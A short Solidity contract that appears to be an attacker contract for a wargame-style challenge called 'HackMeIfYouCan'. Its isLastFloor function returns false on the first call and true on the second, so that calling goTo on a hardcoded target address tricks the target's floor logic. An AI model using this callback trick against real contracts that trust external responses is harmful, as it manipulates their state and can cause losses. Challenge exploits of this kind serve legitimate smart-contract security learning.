pragma solidity ^0.7.0;

import "./HackMeIfYouCan.sol";

contract BuildingArg {
    HackMeIfYouCan public toHack = HackMeIfYouCan(payable(0x9D29D33d4329640e96cC259E141838EB3EB2f1d9));
    
    bool public switchFlipped = false;

    function isLastFloor(uint) external returns (bool) {
        // first call
        if (!switchFlipped) {
            switchFlipped = true;
            return false;
            // second call
        } else {
            switchFlipped = false;
            return true;
        }
    }

    function ExploitgoTo(uint256 _floor) external {
        toHack.goTo(_floor);
    }
}
